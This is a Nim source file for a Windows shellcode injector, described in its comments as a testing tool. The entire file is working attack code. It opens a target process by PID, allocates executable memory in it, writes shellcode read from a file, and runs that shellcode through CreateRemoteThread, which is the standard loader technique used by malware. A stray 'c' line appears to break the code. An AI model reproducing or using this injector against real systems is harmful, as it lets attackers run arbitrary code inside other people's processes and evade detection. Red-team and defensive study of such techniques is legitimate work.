# Compile with:
# nim c -f --os:windows --cpu:amd64 -d:binary injector.nim
import os, strutils, sequtils, winim/lean

# This is a simple PE memory injector for testing purposes

# Function to read shellcode from a binary file
proc readShellcodeFromFile(path: string): seq[byte] =
  # Simple way: read the entire file at once
  try:
    # readFile reads all file content as a string
    let content = readFile(path)
    
    # Convert each byte from the string to a byte sequence
    var shellcode = newSeq[byte](content.len)
    for i in 0..<content.len:
      shellcode[i] = byte(content[i])
    
    return shellcode
  except:
    echo "Error reading file: ", getCurrentExceptionMsg()
    return @[]

# Main function to inject the shellcode
proc injectShellcode(pid: int, shellcode: seq[byte]) =
  # Get a handle to the process
  let hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid))
  if hProcess == 0:
    echo "Error opening process: ", GetLastError()
    return
c
  # Allocate memory in the target process
  let shellcodeSize = SIZE_T(shellcode.len)
  let pRemoteShellcode = VirtualAllocEx(hProcess, nil, shellcodeSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  if pRemoteShellcode == nil:
    echo "Error allocating memory in process: ", GetLastError()
    CloseHandle(hProcess)
    return

  # Write shellcode into process memory
  var bytesWritten: SIZE_T
  let written = WriteProcessMemory(hProcess, pRemoteShellcode, unsafeAddr shellcode[0], shellcodeSize, addr bytesWritten)
  if written == 0:
    echo "Error writing to process memory: ", GetLastError()
    VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE)
    CloseHandle(hProcess)
    return

  # Create remote thread to execute shellcode
  var threadId: DWORD
  let hThread = CreateRemoteThread(hProcess, nil, 0, cast[LPTHREAD_START_ROUTINE](pRemoteShellcode), nil, 0, addr threadId)
  if hThread == 0:
    echo "Error creating remote thread: ", GetLastError()
    VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE)
    CloseHandle(hProcess)
    return

  echo "Shellcode successfully injected and executed."
  CloseHandle(hThread)
  CloseHandle(hProcess)

# Main function
proc main() =
  if paramCount() != 2:
    echo "Usage: injector <PID> <shellcode_path>"
    return

  let pid = parseInt(paramStr(1))
  let shellcodePath = paramStr(2)

  let shellcode = readShellcodeFromFile(shellcodePath)
  if shellcode.len == 0:
    echo "Could not read shellcode."
    return

  injectShellcode(pid, shellcode)

# Execute main function
main()